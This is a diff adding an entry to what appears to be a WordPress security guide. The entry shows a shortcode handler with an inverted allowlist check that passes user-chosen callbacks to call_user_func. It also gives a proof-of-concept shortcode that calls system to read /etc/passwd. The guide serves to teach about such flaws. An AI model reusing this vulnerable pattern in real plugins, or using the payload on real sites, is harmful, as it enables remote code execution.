@@ -3349,8 +3349,40 @@ $input = $_GET["input"];
 $result = $action_type($input);
 echo $result;
 ```
+- Vulnerable code-:
 
+```php
+function image_render_callback($atts) {
+  $atts = shortcode_atts( array(
+    'sanitize' => 'esc_attr',
+    'src'=>'',
+        'text'=>''
+  ), $atts);
 
+    $chosen_callback = "esc_attr";
+    $sanitize_callback = array("trim", "esc_attr", "esc_html", "sanitize_text_field");
+    if(!in_array($atts["sanitize"], $sanitize_callback)){
+        $chosen_callback = $atts["sanitize"];
+    }
+
+    if ( ! empty( $chosen_callback ) && is_callable( $chosen_callback ) ) {
+        $text = call_user_func( $chosen_callback, $atts["text"] );
+    }
+
+    return sprintf("<img src='%s'>%s</img>", esc_attr($atts["src"]), esc_html($text));
+
+}
+
+add_shortcode("imagerender", "image_render_callback");
+```
+
+- `call_user_func` is vulnerble to RCE.To exploit this, the Contributor+ role user simply needs to create a drafted post with the below content to trigger RCE via call_user_func function:
+
+```wordpress
+[imagerender src="https://patchstack.com" sanitize="system" text="cat /etc/passwd"]
+```
+
+------------------
 
 
 
